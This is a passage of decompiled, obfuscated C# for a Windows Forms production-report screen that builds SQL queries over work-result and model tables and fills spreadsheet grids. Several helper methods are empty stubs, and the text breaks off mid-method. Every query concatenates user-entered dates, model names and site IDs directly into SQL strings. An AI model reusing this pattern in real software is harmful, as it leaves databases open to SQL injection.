using System;
using System.Collections.Generic;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sc0;
using e7B;

namespace b8G;

public class z6X
{
	private object intcell;

	private string save_excel;

	public object DockContainerItem1
	{
		[CompilerGenerated]
		get
		{
			return _DockContainerItem1;
		}
		[CompilerGenerated]
		set
		{
			_DockContainerItem1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object DockContainerItem2
	{
		[CompilerGenerated]
		get
		{
			return _DockContainerItem2;
		}
		[CompilerGenerated]
		set
		{
			_DockContainerItem2 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object DateTimeInput1
	{
		[CompilerGenerated]
		get
		{
			return _DateTimeInput1;
		}
		[CompilerGenerated]
		set
		{
			_DateTimeInput1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object DateTimeInput2
	{
		[CompilerGenerated]
		get
		{
			return _DateTimeInput2;
		}
		[CompilerGenerated]
		set
		{
			_DateTimeInput2 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public string Site_id { get; set; }

	public object FpSpread1
	{
		[CompilerGenerated]
		get
		{
			return _FpSpread1;
		}
		[CompilerGenerated]
		set
		{
			_FpSpread1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object FpSpread2
	{
		[CompilerGenerated]
		get
		{
			return _FpSpread2;
		}
		[CompilerGenerated]
		set
		{
			_FpSpread2 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ButtonItem2
	{
		[CompilerGenerated]
		get
		{
			return _ButtonItem2;
		}
		[CompilerGenerated]
		set
		{
			_ButtonItem2 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object NewBtn1
	{
		[CompilerGenerated]
		get
		{
			return _NewBtn1;
		}
		[CompilerGenerated]
		set
		{
			_NewBtn1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ButtonItem3
	{
		[CompilerGenerated]
		get
		{
			return _ButtonItem3;
		}
		[CompilerGenerated]
		set
		{
			_ButtonItem3 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object SaveBtn1
	{
		[CompilerGenerated]
		get
		{
			return _SaveBtn1;
		}
		[CompilerGenerated]
		set
		{
			_SaveBtn1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ButtonItem4
	{
		[CompilerGenerated]
		get
		{
			return _ButtonItem4;
		}
		[CompilerGenerated]
		set
		{
			_ButtonItem4 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object DelBtn1
	{
		[CompilerGenerated]
		get
		{
			return _DelBtn1;
		}
		[CompilerGenerated]
		set
		{
			_DelBtn1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ButtonItem5
	{
		[CompilerGenerated]
		get
		{
			return _ButtonItem5;
		}
		[CompilerGenerated]
		set
		{
			_ButtonItem5 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object PrtBtn1
	{
		[CompilerGenerated]
		get
		{
			return _PrtBtn1;
		}
		[CompilerGenerated]
		set
		{
			_PrtBtn1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ButtonItem6
	{
		[CompilerGenerated]
		get
		{
			return _ButtonItem6;
		}
		[CompilerGenerated]
		set
		{
			_ButtonItem6 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object XlsBtn1
	{
		[CompilerGenerated]
		get
		{
			return _XlsBtn1;
		}
		[CompilerGenerated]
		set
		{
			_XlsBtn1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object FindBtn
	{
		[CompilerGenerated]
		get
		{
			return _FindBtn;
		}
		[CompilerGenerated]
		set
		{
			_FindBtn = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object SaveFileDialog1
	{
		[CompilerGenerated]
		get
		{
			return _SaveFileDialog1;
		}
		[CompilerGenerated]
		set
		{
			_SaveFileDialog1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	private void w1F(object sender, EventArgs e)
	{
		NewLateBinding.LateSetComplex(DockContainerItem1, (Type)null, "Text", new object[1] { "Form Menu" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(DockContainerItem2, (Type)null, "Text", new object[1] { "Retrieve Condition" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(DateTimeInput1, (Type)null, "Value", new object[1] { DateAndTime.get_Now() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(DateTimeInput2, (Type)null, "Value", new object[1] { DateAndTime.get_Now() }, (string[])null, (Type[])null, false, true);
		if (!Ts6(RuntimeHelpers.GetObjectValue(q7H()), "SELECT model_no FROM tbl_modelmaster WHERE site_id = '" + Site_id + "' and active = 'Y' ORDER BY model_no"))
		{
		}
		NewLateBinding.LateCall(NewLateBinding.LateGet(q7H(), (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "ALL" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(q7H(), (Type)null, "Text", new object[1] { "ALL" }, (string[])null, (Type[])null, false, true);
		if (Qg2(RuntimeHelpers.GetObjectValue(FpSpread1), "SP_COMMON_GETCODEMASTER", "R0001", "INT"))
		{
			object obj = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
			NewLateBinding.LateSetComplex(obj, (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(obj, (Type)null, "AddColumns", new object[2] { 0, 1 }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Height", new object[1] { 60 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "WORK DATE" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(obj, (Type)null, "AddColumns", new object[2] { 0, 1 }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Height", new object[1] { 40 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "MODEL" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(obj, (Type)null, "ColumnCount", new object[1] { Operators.AddObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "TOTAL" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "BackColor", new object[1] { Color.Yellow }, (string[])null, (Type[])null, false, true);
			Fw6(RuntimeHelpers.GetObjectValue(FpSpread1));
			NewLateBinding.LateSetComplex(obj, (Type)null, "FrozenColumnCount", new object[1] { 2 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[2]
			{
				2,
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, "Width", new object[1] { 50 }, (string[])null, (Type[])null, false, true);
			obj = null;
		}
		if (Hj7(RuntimeHelpers.GetObjectValue(FpSpread2), "FrmWKRESULT"))
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
			Fw6(RuntimeHelpers.GetObjectValue(FpSpread2));
		}
		s1R(RuntimeHelpers.GetObjectValue(ButtonItem2), RuntimeHelpers.GetObjectValue(Ct2()), "NEW");
		y4S(RuntimeHelpers.GetObjectValue(NewBtn1), RuntimeHelpers.GetObjectValue(Ct2()), "NEW");
		s1R(RuntimeHelpers.GetObjectValue(ButtonItem3), RuntimeHelpers.GetObjectValue(Ct2()), "SAVE");
		y4S(RuntimeHelpers.GetObjectValue(SaveBtn1), RuntimeHelpers.GetObjectValue(Ct2()), "SAVE");
		s1R(RuntimeHelpers.GetObjectValue(ButtonItem4), RuntimeHelpers.GetObjectValue(Ct2()), "DELETE");
		y4S(RuntimeHelpers.GetObjectValue(DelBtn1), RuntimeHelpers.GetObjectValue(Ct2()), "DELETE");
		s1R(RuntimeHelpers.GetObjectValue(ButtonItem5), RuntimeHelpers.GetObjectValue(Ct2()), "PRINT");
		y4S(RuntimeHelpers.GetObjectValue(PrtBtn1), RuntimeHelpers.GetObjectValue(Ct2()), "PRINT");
		s1R(RuntimeHelpers.GetObjectValue(ButtonItem6), RuntimeHelpers.GetObjectValue(Ct2()), "EXCEL");
		y4S(RuntimeHelpers.GetObjectValue(XlsBtn1), RuntimeHelpers.GetObjectValue(Ct2()), "EXCEL");
		y4S(RuntimeHelpers.GetObjectValue(FindBtn), RuntimeHelpers.GetObjectValue(Ct2()), "FIND");
	}

	private void y4S(object t5J, object m2D, string q7C)
	{
		throw new NotImplementedException();
	}

	private object Ct2()
	{
		throw new NotImplementedException();
	}

	private void s1R(object c6R, object Zi7, string a9K)
	{
		throw new NotImplementedException();
	}

	private bool Hj7(object Et1, string Bi1)
	{
		throw new NotImplementedException();
	}

	private void Fw6(object Wd2)
	{
		throw new NotImplementedException();
	}

	private bool Qg2(object Zo6, string f8Z, string Es0, string m4K)
	{
		throw new NotImplementedException();
	}

	private bool Ts6(object a5Y, string r2D)
	{
		throw new NotImplementedException();
	}

	private object q7H()
	{
		throw new NotImplementedException();
	}

	public bool Sd1()
	{
		d2F("EXEC SP_COMMON_GETWKRESULT '" + Site_id + "'");
		string text = "select MODEL, wk_date,\r\n";
		text += q8X(RuntimeHelpers.GetObjectValue(FpSpread1), "ISNULL((SELECT sum(cnt) FROM TBL_WKRESULT WHERE SITE_ID = A.SITE_ID AND WK_DATE = A.WK_DATE and model = a.model AND C_PRC = (SELECT CODE_ID FROM TBL_CODEMASTER WHERE SITE_ID = A.SITE_ID AND CLASS_ID = 'R0001' AND CODE_NAME = '", "')),0),", 2);
		text += "ISNULL((SELECT sum(cnt) FROM TBL_wkresult WHERE SITE_ID = A.SITE_ID AND WK_DATE = A.WK_DATE and model = a.model),0) \r\n";
		text += "FROM TBL_WKresult A ";
		text = text + "WHERE SITE_ID = '" + Site_id + "'\r\n";
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "  and wk_date between '"), NewLateBinding.LateGet(DateTimeInput1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' and '"), NewLateBinding.LateGet(DateTimeInput2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' "), (object)"\r\n"));
		if (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(q7H(), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"ALL", false))
		{
			text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "  and model = '"), NewLateBinding.LateGet(q7H(), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"), (object)"\r\n"));
		}
		text += "GROUP BY SITE_ID, MODEL, wk_date\r\n";
		text += "ORDER BY SITE_ID, MODEL, wk_date";
		if (Zi8(RuntimeHelpers.GetObjectValue(FpSpread1), text, 1))
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[1] { Operators.AddObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Cells", new object[4]
			{
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
				1,
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Cells", new object[4]
			{
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
				0,
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, "BackColor", new object[1] { Color.Yellow }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetText", new object[3]
			{
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
				0,
				"TOTAL"
			}, (string[])null, (Type[])null, (bool[])null, true);
			q6G(RuntimeHelpers.GetObjectValue(FpSpread1), 2, Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1), 1);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[2]
			{
				2,
				Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, "Width", new object[1] { 50 }, (string[])null, (Type[])null, false, true);
		}
		bool result = default(bool);
		return result;
	}

	private void q6G(object w7E, int z4M, object Nm9, int Hp1)
	{
		throw new NotImplementedException();
	}

	private bool Zi8(object Fk8, string w6N, int f5D)
	{
		throw new NotImplementedException();
	}

	private string q8X(object n1S, string Fb1, string Xz5, int Nf0)
	{
		throw new NotImplementedException();
	}

	private void d2F(string Cw2)
	{
		throw new NotImplementedException();
	}

	private void c9C(object sender, EventArgs e)
	{
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		Sd1();
	}

	private void Tw5(object Lo1, object t1T)
	{
		string text = "";
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		object obj = NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		NewLateBinding.LateSetComplex(obj, (Type)null, "ColumnCount", new object[1] { 4 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "모델" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "일반" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "폴리싱" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "합계" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[2] { 1, 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
		text = "SELECT MODEL, \r\n";
		string text2 = text + "ISNULL((SELECT SUM(CNT) FROM TBL_WKRESULT WHERE wk_date between '";
		object obj2 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array = new object[2];
		object obj3 = t1T;
		array[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array[1] = 1;
		object[] array2 = array;
		bool[] obj4 = new bool[2] { true, false };
		bool[] array3 = obj4;
		object obj5 = NewLateBinding.LateGet(obj2, (Type)null, "GetValue", array, (string[])null, (Type[])null, obj4);
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj6 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)text2, obj5), (object)"' AND '");
		object obj7 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array4 = new object[2];
		obj3 = t1T;
		array4[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array4[1] = 1;
		array2 = array4;
		obj5 = NewLateBinding.LateGet(obj7, (Type)null, "GetValue", array4, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj8 = Operators.ConcatenateObject(Operators.ConcatenateObject(obj6, obj5), (object)"' AND C_PRC = (SELECT CODE_ID FROM TBL_CODEMASTER WHERE CLASS_ID = 'R0001' AND CODE_NAME = '");
		object obj9 = NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array5 = new object[1];
		obj3 = t1T;
		array5[0] = NewLateBinding.LateGet(obj3, (Type)null, "Column", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array5;
		obj5 = NewLateBinding.LateGet(obj9, (Type)null, "Columns", array5, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Column", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj8, NewLateBinding.LateGet(obj5, (Type)null, "Label", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"') AND MODEL = A.MODEL AND OP_CD = 'GEN'),0),"), (object)"\r\n"));
		string text3 = text + "ISNULL((SELECT SUM(CNT) FROM TBL_WKRESULT WHERE wk_date between '";
		object obj10 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array6 = new object[2];
		obj3 = t1T;
		array6[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array6[1] = 1;
		array2 = array6;
		obj5 = NewLateBinding.LateGet(obj10, (Type)null, "GetValue", array6, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj11 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)text3, obj5), (object)"' AND '");
		object obj12 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array7 = new object[2];
		obj3 = t1T;
		array7[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array7[1] = 1;
		array2 = array7;
		obj5 = NewLateBinding.LateGet(obj12, (Type)null, "GetValue", array7, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj13 = Operators.ConcatenateObject(Operators.ConcatenateObject(obj11, obj5), (object)"' AND C_PRC = (SELECT CODE_ID FROM TBL_CODEMASTER WHERE CLASS_ID = 'R0001' AND CODE_NAME = '");
		object obj14 = NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array8 = new object[1];
		obj3 = t1T;
		array8[0] = NewLateBinding.LateGet(obj3, (Type)null, "Column", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array8;
		obj5 = NewLateBinding.LateGet(obj14, (Type)null, "Columns", array8, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Column", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj13, NewLateBinding.LateGet(obj5, (Type)null, "Label", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"') AND MODEL = A.MODEL AND OP_CD = 'POL'),0),"), (object)"\r\n"));
		string text4 = text + "ISNULL((SELECT SUM(CNT) FROM TBL_WKRESULT WHERE wk_date between '";
		object obj15 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array9 = new object[2];
		obj3 = t1T;
		array9[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array9[1] = 1;
		array2 = array9;
		obj5 = NewLateBinding.LateGet(obj15, (Type)null, "GetValue", array9, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj16 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)text4, obj5), (object)"' AND '");
		object obj17 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array10 = new object[2];
		obj3 = t1T;
		array10[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array10[1] = 1;
		array2 = array10;
		obj5 = NewLateBinding.LateGet(obj17, (Type)null, "GetValue", array10, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		object obj18 = Operators.ConcatenateObject(Operators.ConcatenateObject(obj16, obj5), (object)"' AND C_PRC = (SELECT CODE_ID FROM TBL_CODEMASTER WHERE CLASS_ID = 'R0001' AND CODE_NAME = '");
		object obj19 = NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array11 = new object[1];
		obj3 = t1T;
		array11[0] = NewLateBinding.LateGet(obj3, (Type)null, "Column", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array11;
		obj5 = NewLateBinding.LateGet(obj19, (Type)null, "Columns", array11, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Column", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj18, NewLateBinding.LateGet(obj5, (Type)null, "Label", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"') AND MODEL = A.MODEL),0)"), (object)"\r\n"));
		text += "from tbl_wkresult a\r\n";
		string text5 = text + "where model = '";
		object obj20 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
